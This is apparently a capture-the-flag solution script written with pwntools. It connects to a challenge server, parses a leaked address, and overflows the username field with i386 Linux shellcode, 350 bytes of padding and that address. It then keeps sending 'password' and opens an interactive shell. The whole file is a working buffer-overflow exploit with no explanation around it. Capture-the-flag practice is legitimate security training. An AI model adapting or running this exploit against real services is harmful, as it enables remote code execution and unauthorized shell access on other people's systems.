#!/usr/bin/python3
import pwn
from pwn import *



offset = 350

sock=remote('challenge.us',11111)
input = sock.recvline_startswith("Your input")
print(input)
input = (input[-10:])
input=(input.decode("utf-8"))
key = p32(int(input, 0))
print(key)
sock.recvline(1024) #Enter username
padding = "A" * offset
print(bytes(padding, "utf-8") + key)
sock.sendline(asm(shellcraft.i386.linux.sh()) + bytes(padding, "utf-8") + key) #Sends username
sock.sendline( bytes(padding, "utf-8") + key) #Sends username

a = sock.recv(1024) #Hello, username, Enter Password
print(a)
sock.sendline("password")
while True:
    a = sock.recvline(timeout=1)
    print(a)
    try:
        if 'Incorrect' in a.decode('utf-8'):
            sock.sendline('password')
        if a == b'':
            sock.interactive()
    except:
        pass
